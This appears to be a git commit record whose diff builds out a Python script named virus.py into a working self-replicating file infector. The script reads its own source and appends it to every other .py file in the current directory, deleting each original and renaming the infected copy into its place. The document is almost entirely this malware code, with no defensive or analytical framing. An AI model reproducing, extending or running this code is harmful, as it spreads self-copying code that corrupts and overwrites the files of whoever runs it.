aac7963c1ca378643cf2c5e28c7b242b2bec705f
Aaron Pop <FezFamiliar@yahoo.com>
2019-10-14 11:44:08 +0300

    modified infection function

--- virus.py
+++ virus.py
@@ -4,7 +4,7 @@ import glob,os,hashlib,winsound
 
 FREQ = 2500  
 DUR = 1000  
-
+global i
 def Beep(frequency,duration):
     winsound.Beep(frequency, duration)
 
@@ -14,14 +14,25 @@ def create_checksum(filename):
         hasher.update(file.read())
     print(hasher.hexdigest())
 
-def infect():
+def infect(PAYLOAD):
+    i = 0
     for file in glob.glob("*.py"):
         if file == __file__:
             continue
-        print(file)
+        f = open(file, "r")
+        if f.mode == 'r':
+            infected = open('infected_'+str(i)+'.py','w')
+            infected.write(f.read() + PAYLOAD)
+            f.close()
+            infected.close()
+            os.remove(file)
+            os.rename('infected_'+str(i)+'.py',file)
+            i = i + 1
+            
 
 
 
+with open(__file__,'r') as current_file:
+    PAYLOAD = current_file.read()
 
-
-infect()
+infect(PAYLOAD)
